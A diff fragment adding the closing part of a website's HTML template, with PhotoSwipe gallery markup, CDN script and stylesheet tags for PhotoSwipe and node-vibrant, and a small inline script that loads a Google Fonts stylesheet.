+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
